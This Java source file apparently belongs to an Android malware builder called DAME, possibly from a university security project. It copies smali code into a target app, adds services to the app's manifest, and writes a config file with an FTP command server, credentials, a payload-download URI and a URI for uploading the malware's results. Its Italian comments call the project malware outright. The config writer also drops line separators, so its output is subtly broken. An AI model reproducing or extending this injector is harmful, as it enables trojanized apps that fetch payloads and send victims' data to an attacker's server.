/**
 *	@author Roberto Falzarano <robertofalzarano@gmail.com>
 */

package it.unisannio.srss.dame.injection;

import it.unisannio.srss.dame.ManifestManipulator;
import it.unisannio.srss.utils.DirectoryCopier;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class CommonInjector {

	private final static Logger LOG = LoggerFactory
			.getLogger(CommonInjector.class);

	public static final String manifestName = "AndroidManifest.xml";

	final static String CONFIG_FILE = "config.properties";
	final static String SERVER_PROPERTY = "server";
	final static String DOWNLOAD_PROPERTY = "payload_uri";
	final static String UPLOAD_PROPERTY = "result_uri";
	final static String USERNAME_PROPERTY = "username";
	final static String PASSWORD_PROPERTY = "password";

	/**
	 * Copia il contenuto di una directory in un'altra directory
	 * 
	 * @param commonSmaliSource
	 *            la directory che contiene lo smali da copiare
	 * @param appSmaliPath
	 *            la directory in cui si vuole copiare lo smali
	 * @throws FileNotFoundException
	 *             se il path di una delle due directory non esiste
	 */
	public static void injectSmali(Path commonSmaliSource, Path appSmaliPath)
			throws FileNotFoundException {

		if (Files.notExists(commonSmaliSource) || Files.notExists(appSmaliPath)) {
			String msg = "Common smali source or app smali source directory doesn't exist";
			LOG.error(msg);
			throw new FileNotFoundException(msg);
		}

		LOG.info("Start coping common smali from "
				+ commonSmaliSource.toString() + " to "
				+ appSmaliPath.toString());
		try {
			DirectoryCopier.copy(commonSmaliSource, appSmaliPath);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		LOG.info("End coping common smali code");
	}

	/**
	 * Inietta nel manifesto una serie di servizi
	 * 
	 * @param manifestPath
	 *            il path del file che rappresenta il manifesto
	 * @param services
	 *            la lista di servizi che si vuole iniettare
	 * @return <code>true</code> se l'operazione è andata a buon fine,
	 *         <code>false</code> altrimenti.
	 * @throws FileNotFoundException
	 *             se il path che viene indicato e' errato
	 */
	public static boolean injectServices(Path manifestPath, String... services)
			throws FileNotFoundException {
		// TODO manca la modifica del manifest: bisogna (1) aggiungere i servizi
		// al manifest e (2) aggiungere i permessi necessari ai payload scelti
		// dall'utente.
		if (!manifestPath.endsWith(manifestName)) {
			String msg = "Manifest not found";
			LOG.error(msg);
			throw new FileNotFoundException(msg);
		}

		LOG.info("Start adding service to manifest");
		File manifest = manifestPath.toFile();
		ManifestManipulator manifestManipulator = new ManifestManipulator(
				manifest);
		manifestManipulator.addServices(services);
		boolean ret = manifestManipulator.writeOutputManifest();
		LOG.info("End adding service to manifest");

		return ret;
	}

	/**
	 * Inietta la configurazione per la connessione al server ftp nella parte
	 * android del progetto del malware
	 * 
	 * @param dameAndroid
	 *            il root path in cui e' presente il progetto DAME Android
	 * @param ftpURL
	 *            l'url del server ftp
	 * @param username
	 *            lo username per la connessione al server
	 * @param password
	 *            la password per la connessione al server
	 * @param payloadsURI
	 *            l'URI al quale è possibile scaricare i payloads
	 * @param resultURI
	 *            l'URI al quale è possibile caricare i risultati
	 *            dell'esecuzione del malware
	 * @throws IOException
	 */
	public static void injectFtpConfig(Path dameAndroid, String ftpURL,
			String username, String password, String payloadsURI,
			String resultURI) throws IOException {
		// TODO manca la generazione del file che contiene url e credenziali del
		// server ftp.
		// assumi che tutte queste informazioni vengono passate come parametri
		Path config = Paths.get(dameAndroid.toString(), "src", "it",
				"unisannio", "srss", "dame", "android", CONFIG_FILE);
		File configFile = config.toFile();

		if (!configFile.exists())
			configFile.createNewFile();

		if (!configFile.canWrite()) {
			String err = "Could not write to output config file: "
					+ configFile.getAbsolutePath();
			LOG.error(err);
			throw new FileNotFoundException(err);
		}

		// overwrite
		LOG.info("Start writing ftp config file");
		FileWriter configWriter = new FileWriter(configFile, false);
		configWriter.write(SERVER_PROPERTY + "=" + ftpURL);
		LOG.debug("Write:\t" + SERVER_PROPERTY + "=" + ftpURL);
		configWriter.write(USERNAME_PROPERTY + "=" + username);
		LOG.debug("Write:\t" + USERNAME_PROPERTY + "=" + username);
		configWriter.write(PASSWORD_PROPERTY + "=" + password);
		LOG.debug("Write:\t" + PASSWORD_PROPERTY + "=" + password);
		configWriter.write(DOWNLOAD_PROPERTY + "=" + payloadsURI);
		LOG.debug("Write:\t" + DOWNLOAD_PROPERTY + "=" + payloadsURI);
		configWriter.write(UPLOAD_PROPERTY + "=" + resultURI);
		LOG.debug("Write:\t" + UPLOAD_PROPERTY + "=" + resultURI);
		configWriter.flush();
		configWriter.close();
	}
}
